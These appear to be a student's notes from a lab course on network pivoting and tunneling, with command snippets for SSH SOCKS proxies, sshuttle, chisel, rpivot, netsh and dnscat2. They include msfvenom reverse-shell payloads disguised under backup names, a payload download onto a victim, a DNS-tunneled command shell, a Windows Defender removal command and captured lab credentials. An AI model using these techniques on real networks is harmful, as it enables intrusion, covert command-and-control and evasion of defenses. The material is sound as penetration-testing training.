# Pivoting, Tunneling, and Port Forwarding

# Dynamic Port Forwarding with SSH and SOCKS Tunneling

You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)

```bash

ifconfig

```

Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop. 

```bash

netstat -antp 

ssh -D 9050 ubuntu@10.129.194.203

proxychains nmap -v -Pn -sT 172.16.5.19 # 3389

sudo proxychains rdesktop 172.16.5.19 -u victor -p pass@123


```

# Meterpreter Tunneling & Port Forwarding

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.16.51 -f exe -o backupscript.exe LPORT=8080

 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.16.51 -f elf -o backupjob LPORT=8080
    # send a file yo victim machine and run the program

 use exploit/multi/handler

 set lhost 0.0.0.0

 set lport 8080

 set payload linux/x64/meterpreter/reverse_tcp

 run

Invoke-WebRequest -Uri "http://172.16.5.15:8000/backupscript.exe" -OutFile "C:\Users\mlefay\Downloads\backupscript.exe"

meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23





```

# Socat Redirection with a Reverse Shell




# SSH Pivoting with Sshuttle

Try using sshuttle from Pwnbox to connect via RDP to the Windows target (172.16.5.19) with "victor:pass@123" on the internal network. Once completed type: "I tried sshuttle" as the answer.

```bash
# Th3$eTunne1$@rent8oring!
# AC@tinth3Tunnel

sudo sshuttle -r ubuntu@10.129.237.20 172.16.5.0/23 -v 

xfreerdp /v:172.16.5.19 /u:victor /p:pass@123


```

# Web Server Pivoting with Rpivot

```bash

sudo git clone https://github.com/klsecservices/rpivot.git

python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

scp -r rpivot ubuntu@10.129.2.180:/home/ubuntu/

python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

#

```

# Port Forwarding with Windows Netsh


```bash
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19

netsh.exe interface portproxy show v4tov4

xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123


```


#  DNS Tunneling with Dnscat2

```bash
git clone https://github.com/iagox86/dnscat2.git

sudo ruby dnscat2.rb --dns host=10.10.16.51,port=53,domain=inlanefreight.local --no-cache

git clone https://github.com/lukebaggett/dnscat2-powershell.git

# set secret of dnscat2.rb output, on this commando 
Import-Module .\dnscat2.ps1

Start-Dnscat2 -DNSserver 10.10.16.51 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 

window -i 1

```


# SOCKS5 Tunneling with Chisel

Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer. 

```bash

git clone https://github.com/jpillora/chisel.git
cd chisel
go build

scp chisel ubuntu@10.129.202.64:~/

# Running the Chisel Server on the Pivot Host
./chisel server -v -p 1234 --socks5

# Connecting to the Chisel Server
./chisel client -v 10.129.202.64:1234 socks

#  located at /etc/proxychains.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

```


# Skill

```bash

# get id_rsa

sudo sshuttle -e 'ssh -i id_rsa' -r webadmin@10.129.171.56 172.16.5.0/23 -v

#another thing
ssh  -L 9443:127.0.0.1:9443  -L 8111:127.0.0.1:8111  -L 9000:127.0.0.1:9000  -L 5000:127.0.0.1:5000 john@10.10.11.13 -i id_rsa
#######

for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.029 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=2.24 ms


# find file with cred : mlefay:Plain Human work!

uninstall-Windowsfeature -Name Windows-Defender

# remote desktop
#172.16.6.25
#vfrank:Imply wet Unmasked!
#INLANEFREIGHT\vfrank

```
